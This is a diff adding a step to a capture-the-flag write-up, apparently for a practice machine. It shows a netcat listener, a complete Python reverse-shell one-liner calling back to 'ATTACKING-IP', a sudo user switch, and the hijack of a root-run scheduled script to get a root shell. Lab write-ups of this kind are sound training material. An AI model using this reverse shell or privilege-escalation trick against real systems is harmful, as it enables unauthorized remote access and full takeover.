@@ -37,5 +37,49 @@ Nikto shows us many intersting directories - one of them being /dev/. So I conne
 
 ## 2. Using the found scripts to get access
 
+The phpbash.py script is php based webshell, which allows us to set up a reverse shell. 
+![1bashed](https://i.imgur.com/NUbWsT4.png)
+
+First we create an netcat listener on our local kali machine.
+`nc -lvnp 249`
+
+Then I tried to create a normal connection, which got refused as there is no `nc -e`option on the machine.   
+I found a python reverse shell in the web, which I executed with my options.
+
+`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",249));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+
+![2bashed](https://i.imgur.com/SdTGlj9.png)
+
+Python worked as expected. After scanning the files I found a user called scriptuser, so I executed the same command with `sudo -u scriptmanager ....` and got access as scriptmanager.
+
+![3bashed](https://i.imgur.com/99Jd661.png)
+
+Now I had access to the before found /script/ path. There I found another python script, which just echos a hello world.
+
+![4bashed](https://i.imgur.com/vO4mImP.png)
+
+The script appeared to run sometimes, so I just created my own one in the same folder via port 2493 to get access as root.
+
+`cat > file.py`
+
+![5bashed](https://i.imgur.com/1ZGLawt.png)
+
+After waiting a minute or so, port 2493 listener connected to the machine.
+
+![6bashed](https://i.imgur.com/aRauVQP.png)
+
+And there we go, the connection as root!
+Now we finished by capturing the flag!
+
+![7bashed](https://i.imgur.com/mR7HorY.png)
 
 
+
+
+
+created file with cat > file.py
+6
+waited 
+
+7 
+rootshell!
